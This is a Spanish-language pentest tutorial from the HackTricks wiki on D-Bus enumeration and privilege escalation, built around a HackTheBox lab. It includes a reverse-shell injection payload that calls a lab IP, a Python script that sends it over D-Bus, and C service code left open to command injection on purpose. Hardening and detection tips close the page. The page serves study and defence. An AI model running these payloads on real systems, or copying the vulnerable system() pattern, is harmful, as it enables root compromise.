# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus se utiliza como el mediador de comunicaciones entre procesos (IPC) en entornos de escritorio Ubuntu. En Ubuntu, se observa la operación concurrente de varios message buses: el system bus, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes en todo el sistema**, y un session bus para cada usuario autenticado, que expone servicios relevantes solo para ese usuario específico. Aquí, el enfoque recae principalmente en el system bus debido a su asociación con servicios que se ejecutan con privilegios más altos (por ejemplo, root), ya que nuestro objetivo es elevar privilegios. Se señala que la arquitectura de D-Bus emplea un 'router' por cada session bus, responsable de redirigir los mensajes del cliente a los servicios apropiados según la dirección especificada por los clientes para el servicio con el que desean comunicarse.

Los servicios en D-Bus se definen por los **objects** y **interfaces** que exponen. Los objects pueden compararse con instancias de clase en lenguajes OOP estándar, y cada instancia se identifica de forma única mediante un **object path**. Este path, similar a un filesystem path, identifica de manera única cada object expuesto por el servicio. Una interfaz clave para fines de investigación es la interfaz **org.freedesktop.DBus.Introspectable**, que presenta un único método, Introspect. Este método devuelve una representación XML de los métodos, señales y propiedades soportados por el object, con especial atención aquí a los métodos, omitiendo propiedades y señales.

Para la comunicación con la interfaz de D-Bus, se emplearon dos tools: una CLI tool llamada **gdbus** para invocar fácilmente métodos expuestos por D-Bus en scripts, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una GUI tool basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objects contenidos dentro de cada servicio.
```bash
sudo apt-get install d-feet
```
Si estás comprobando el **session bus**, confirma primero la dirección actual:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

En la primera imagen se muestran los servicios registrados con el D-Bus system bus, con **org.debin.apt** específicamente resaltado después de seleccionar el botón System Bus. D-Feet consulta este servicio para objetos, mostrando interfaces, methods, properties y signals para los objetos elegidos, como se ve en la segunda imagen. También se detalla la signature de cada method.

Una característica notable es la visualización del **process ID (pid)** y la **command line** del servicio, útil para confirmar si el servicio se ejecuta con privilegios elevados, algo importante para la relevancia de la investigación.

**D-Feet también permite invocar methods**: los usuarios pueden introducir expresiones Python como parámetros, que D-Feet convierte a tipos D-Bus antes de pasarlos al servicio.

Sin embargo, ten en cuenta que **algunos methods requieren authentication** antes de permitirnos invocarlos. Ignoraremos estos methods, ya que nuestro objetivo es elevar nuestros privilegios sin credentials en primer lugar.

También ten en cuenta que algunos de los services consultan a otro servicio D-Bus llamado org.freedeskto.PolicyKit1 para determinar si un usuario debe o no tener permiso para realizar ciertas acciones.

## **Enumeración de Cmd line**

### List Service Objects

Es posible listar las interfaces D-Bus abiertas con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Los servicios marcados como **`(activatable)`** son especialmente interesantes porque **aún no están en ejecución**, pero una solicitud al bus puede iniciarlos bajo demanda. No te detengas en `busctl list`; asigna esos nombres a los binarios reales que ejecutarían.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Eso te dice rápidamente qué ruta `Exec=` se iniciará para un nombre activable y bajo qué identidad. Si el binario o su cadena de ejecución están débilmente protegidos, un servicio inactivo aún puede convertirse en una vía de privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.

### Service Object Info

Entonces, puedes obtener algo de información sobre la interface con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
También correlaciona el nombre del bus con su unidad de `systemd` y la ruta del ejecutable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Esto responde la pregunta operativa que importa durante privesc: **si una llamada a un método tiene éxito, qué binary y unit reales realizarán la acción?**

### List Interfaces of a Service Object

Necesitas tener suficientes permisos.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspectar la interfaz de un objeto de servicio

Nótese cómo en este ejemplo se seleccionó la última interfaz descubierta usando el parámetro `tree` (_ver sección anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Note el método `.Block` de la interfaz `htb.oouch.Block` (el que nos interesa). La "s" de las otras columnas puede significar que espera una string.

Antes de probar nada peligroso, valide primero un método **orientado a lectura** o de otro modo de bajo riesgo. Esto separa claramente tres casos: sintaxis incorrecta, alcanzable pero denegado, o alcanzable y permitido.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

La introspección te dice **qué** puedes llamar, pero no te dice **por qué** se permite o se deniega una llamada. Para un triage real de privesc, normalmente necesitas inspeccionar **tres capas juntas**:

1. **Activation metadata** (`.service` files or `SystemdService=`) para saber qué binario y unit se ejecutará realmente.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) para saber quién puede `own`, `send_destination`, o `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) para conocer el modelo de autorización por defecto (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
No **asumas** una correspondencia 1:1 entre un método de D-Bus y una acción de Polkit. El mismo método puede elegir una acción diferente según el objeto que se esté modificando o el contexto en tiempo de ejecución. Por lo tanto, el flujo de trabajo práctico es:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` y grep los archivos `.policy` relevantes
3. sondas en vivo de bajo riesgo con `busctl call`, `gdbus call`, o `dbusmap --enable-probes --null-agent`

Los servicios proxy o de compatibilidad merecen atención extra. Un **proxy que se ejecuta como root** y reenvía solicitudes a otro servicio de D-Bus sobre su propia conexión preestablecida puede hacer accidentalmente que el backend trate cada solicitud como si viniera de UID 0, a menos que la identidad del llamador original se vuelva a validar.

### Interface de Monitor/Captura

Con suficientes privilegios (solo `send_destination` y `receive_sender` privileges no son suficientes) puedes **monitorizar una comunicación de D-Bus**.

Para **monitorizar** una **comunicación** necesitarás ser **root.** Si aún encuentras problemas siendo root revisa [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) y [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si sabes cómo configurar un archivo de configuración de D-Bus para **permitir a usuarios no root sniffear** la comunicación, ¡por favor **contáctame**!

Diferentes formas de monitorizar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
En el siguiente ejemplo, la interfaz `htb.oouch.Block` es monitoreada y **el mensaje "**_**lalalalal**_**" es enviado a través de miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puedes usar `capture` en lugar de `monitor` para guardar los resultados en un archivo **pcapng** que Wireshark puede abrir:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrando todo el ruido <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Si hay demasiada información en el bus, pasa una regla de coincidencia como esta:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Se pueden especificar múltiples reglas. Si un mensaje coincide con _cualquiera_ de las reglas, el mensaje se imprimirá. Así:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) para más información sobre la sintaxis de las reglas de coincidencia.

### More

`busctl` tiene aún más opciones, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Como usuario **qtc dentro del host "oouch" de HTB** puedes encontrar un **archivo de configuración D-Bus inesperado** ubicado en _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.

Como el usuario **qtc** dentro del contenedor docker **aeb4525789d8** puedes encontrar algo de código relacionado con dbus en el archivo _/code/oouch/routes.py._ Este es el código interesante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como puedes ver, se está **conectando a una interfaz D-Bus** y enviando a la **función "Block"** el "client_ip".

En el otro lado de la conexión D-Bus hay un binario compilado en C ejecutándose. Este código está **escuchando** en la conexión D-Bus **la dirección IP y está llamando a iptables mediante la función `system`** para bloquear la dirección IP dada.\
**La llamada a `system` es vulnerable a propósito a command injection**, así que un payload como el siguiente creará una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro de él puedes encontrar entre las líneas 91-97 **cómo se registran la ruta del objeto D-Bus** y **el nombre de la interfaz**. Esta información será necesaria para enviar información a la conexión D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Además, en la línea 57 puedes encontrar que **el único método registrado** para esta comunicación D-Bus se llama `Block`(_**Por eso en la siguiente sección los payloads se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

El siguiente código python enviará el payload a la conexión D-Bus al método `Block` mediante `block_iface.Block(runme)` (_nota que fue extraído del fragmento de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl y dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` es una herramienta usada para enviar mensajes al “Message Bus”
- Message Bus – Un software usado por los sistemas para facilitar la comunicación entre aplicaciones. Está relacionado con Message Queue (los mensajes se ordenan en secuencia), pero en Message Bus los mensajes se envían en un modelo de suscripción y además son muy rápidos.
- La etiqueta `-system` se usa para indicar que es un mensaje de sistema, no un mensaje de sesión (por defecto).
- La etiqueta `–print-reply` se usa para imprimir nuestro mensaje correctamente y recibir cualquier respuesta en un formato legible por humanos.
- `–dest=Dbus-Interface-Block` La dirección de la interfaz de Dbus.
- `–string:` – Tipo de mensaje que queremos enviar a la interfaz. Hay varios formatos de envío de mensajes como double, bytes, booleans, int, objpath. De estos, el “object path” es útil cuando queremos enviar la ruta de un archivo a la interfaz de Dbus. Podemos usar un archivo especial (FIFO) en este caso para pasar un comando a la interfaz en nombre de un archivo. `“string:;”` – Esto se usa para llamar de nuevo al object path donde colocamos el archivo/comando de reverse shell FIFO.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

La enumeración manual de una gran superficie de ataque de D-Bus con `busctl`/`gdbus` rápidamente se vuelve tediosa. Dos pequeñas utilidades FOSS publicadas en los últimos años pueden acelerar el trabajo durante red-team o CTF engagements:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* The tool marks unprotected well-known names with `!`, instantly revealing services you can *own* (take over) or method calls that are reachable from an unprivileged shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* The D-Bus module searches the directories below and highlights any service that can be spoofed or hijacked by a normal user:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Vigilar los CVEs publicados recientemente ayuda a detectar patrones inseguros similares en código personalizado. Dos buenos ejemplos recientes son:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | The root-running service exposed a D-Bus interface that unprivileged users could reconfigure, including loading attacker-controlled macro behavior. | If a daemon exposes **device/profile/config management** on the system bus, treat writable configuration and macro features as code-execution primitives, not just "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | A root-running compatibility proxy forwarded requests to backend services without preserving the original caller's security context, so backends trusted the proxy as UID 0. | Treat **proxy / bridge / compatibility** D-Bus services as a separate bug class: if they relay privileged calls, verify how caller UID/Polkit context reaches the backend. |

Patterns to notice:
1. Service runs **as root on the system bus**.
2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
